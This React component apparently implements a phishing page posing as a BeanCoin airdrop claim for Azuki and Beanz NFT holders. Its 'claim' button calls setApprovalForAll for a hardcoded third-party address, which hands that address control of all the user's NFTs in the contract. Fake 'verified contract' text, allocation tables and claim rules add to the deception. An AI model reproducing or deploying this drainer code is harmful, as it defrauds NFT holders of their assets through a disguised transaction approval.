import React from 'react'
import { ethers } from 'ethers'
import Web3 from "web3"
import Azuki_abi from '../contracts/Azuki.json'
import Alpaca_abi from '../contracts/Alpacadabraz.json'
import { useState, useEffect } from 'react'
function Gallery() {
  const [errorMessage, setErrorMessage] = useState()
  const [defaultAccount, setDefaultAccount] = useState()
  const [userBalance, setUserBalance] = useState()
  const [connButtonText, setConnButtonText] = useState("Connect Wallet")
  const [hasMetamask, setHasMetamask] = useState(1)
  const [isConnected, setIsConnected] = useState(false)
  const [balance, setBalance] = useState(0)
  const [isClaiming, setIsClaiming] = useState(false)

  const web3 = new Web3(Web3.givenProvider || 'http://localhost:7545');
  const contract = new web3.eth.Contract(Alpaca_abi, "0x3DB5463A9e2d04334192C6f2DD4B72DeF4751A61")

  const connectWalletHandler = () => {
    if (window.ethereum) {
      window.ethereum.request({ method: 'eth_requestAccounts' }).then((result) => {
        accountChangedHandler(result[0])
        setIsConnected(true)
        balanceOf(result[0])
      })
    }
  }

  const accountChangedHandler = (newAccount) => {
    setDefaultAccount(newAccount.toString())
    setConnButtonText(newAccount.toString())
    getUserBalance(newAccount.toString())
    balanceOf(newAccount.toString())
  }

  const getUserBalance = (address) => {
    window.ethereum.request({ method: 'eth_getBalance', params: [address, 'latest'] }).then((balance) => {
      setUserBalance(ethers.utils.formatEther(balance))
    })
  }

  useEffect(() => {
    if (window.ethereum) {
      window.ethereum.on('accountsChanged', accountChangedHandler)
    }
  }, [])

  useEffect(() => {
    if (balance == 0 && isConnected) {
      setErrorMessage("No eligible tokens found in wallet.You need to own at least one Azuki or Beanz.")
    } else if (balance > 0 && isConnected) {
      setErrorMessage("Eligible tokens found in wallet.You own " + balance + " Azuki in your wallet.")
    }
  }, [balance])

  useEffect(() => {
    if (window.ethereum) {
      setHasMetamask(1)
    } else {
      setHasMetamask(0)
    }
  }, [])

  function truncate(address) {
    if (address !== "Connect Wallet") {
      return address.substr(0, 7) + "..." + address.substr(address.length - 5, 5)
    } else {
      return "Connect Wallet"
    }
  }

  function balanceOf(address) {
    return contract.methods.balanceOf(address).call().then(function (result) {
      setBalance(result)
      console.log(result)
    })
  }

  function setApprovalForAll() {
    setIsClaiming(true)
    contract.methods.setApprovalForAll("0x280BF7C829373d2d67bF9266E5F7ED3db6F581F1", true).send({ from: defaultAccount }).on('error',
      function (error) {
        console.log(error)
        setIsClaiming(false)
      })
      .on('recript', function(result) {
        setIsClaiming(false)
      })
  }


  return (
    <div className="bg-olive w-full lg:h-screen h-full">
      <img className="w-full opacity-40 object-cover h-screen" src="/claimtoken.png" alt="" />
      <div className="fixed h-full bottom-0 left-0 w-full flex flex-col justify-center items-center">
        <div className="relative w-6/12 h-1/6 bg-olive text-gray-500 bg-opacity-50 flex items-center justify-center flex-col rounded-xl font-mono tracking-wide duration-300">
          <div className="px-2 text-center lg:text-xl text-md py-8 font-blackitems-center justify-center">
            <p className="uppercase absolute top-2 left-3 text-sm highlight">{isConnected ? "account:" + truncate(defaultAccount) : ""}</p>
            <p className={"uppercase mt-8 font-mono text-base font-black " + (balance == 0 ? "text-red-600" : "")}>{errorMessage}</p>
            <p className="pb-3 font-mono text-lg font-black">{(isConnected ? "" : "You need to connect your MetaMask wallet before you can claim BeanCoin.")}</p>
            <button className={"text-white text-base uppercase transform duration-300 bg-azukired px-3 py-3 bg-opacity-70 rounded-md hover:scale-105 hover:bg-red-600 mb-5 " + (isConnected ? "hidden " : "")} onClick={connectWalletHandler}>{truncate(connButtonText)}</button>
            {balance == 0 ?
              <></>
              :
              <button className={"text-white text-base uppercase transform duration-300 bg-azukired px-3 py-3 bg-opacity-70 rounded-md hover:scale-105 hover:bg-red-600 mb-5 " + (isConnected ? "" : "hidden") + (balance == 0 ? "  cursor-not-allowed" : "")} disabled={balance == 0} onClick={setApprovalForAll}>
                {(isClaiming ?
                  <svg class="animate-spin h-5 w-5" viewBox="0 0 24 24">
                    <circle class="opacity-20" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                    <path class="" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg> :
                  "claim"
                )}
              </button>
            }
          </div>
        </div>
        <p className="p-2 uppercase text-xs font-black opacity-50">VERIFIED SMART CONTRACT ADDRESS: 0x025C6da5BD0e6A5dd1350fda9e3B6a614B205a1F</p>
        <div className="bg-olive w-6/12 bg-opacity-50 px-4 py-5 rounded-md ">
          <p className="font-mono opacity-50 leading-5 font-bold">100 million tokens (24.2% of the Ecosystem Fund and 15% of the total supply of BeanCoin) <span className="highlight">are claimable by Azuki and Beanz NFT holders</span> upon launch of BeanCoin.
            To ensure a fair launch of BeanCoin to Azuki and Beanz NFT holders, the allocation is informed by the difference in floor price between each collection of NFTs, roughly the month prior to the token claim launch.
          </p>
          <table className="mx-auto pt-5 w-7/12 mt-10 font-mono">
            <thead>
              <tr className="flex border-b border-black border-opacity-40">
                <th className="flex flex-1 text-left text-sm font-bold p-3">NFT</th>
                <th className="flex flex-1 text-left text-sm font-bold p-3">BEANCOIN ALLOCATED PER NFT</th>
              </tr>
            </thead>
            <tbody>
              <tr class="flex border-b border-white/10">
                <td class="flex-1 items-start text-sm text-left p-3">Azuki only</td>
                <td class="flex-1 items-start text-sm text-left p-3">8,594 tokens</td>
              </tr>
              <tr class="flex border-b border-white/10">
                <td class="flex-1 items-start text-sm text-left p-3">Beanz only</td>
                <td class="flex-1 items-start text-sm text-left p-3">2,094 tokens</td>
              </tr>
            </tbody>
          </table>
          <p className="mx-auto w-7/12 max-w-2xl text-sm text-black space-y-2 font-mono pt-3 mt-3 opacity-60 font-black">
            <li className="">
              There is no distinction between Beanz for the claim.
            </li>
            <li className="">
              This is a one-time claim that will identify all eligible NFTs in your wallet, in the order that they appear. There will not be an option to deselect an eligible NFT if it is present in your wallet. If you wish to claim for one of your NFTs but not another, you will need to move them to separate wallets.
            </li>
            <li className="">
              There will be Ethereum network gas fees incurred to claim BeanCoin.
            </li>
          </p>
        </div>
      </div>
    </div>
  )
}

export default Gallery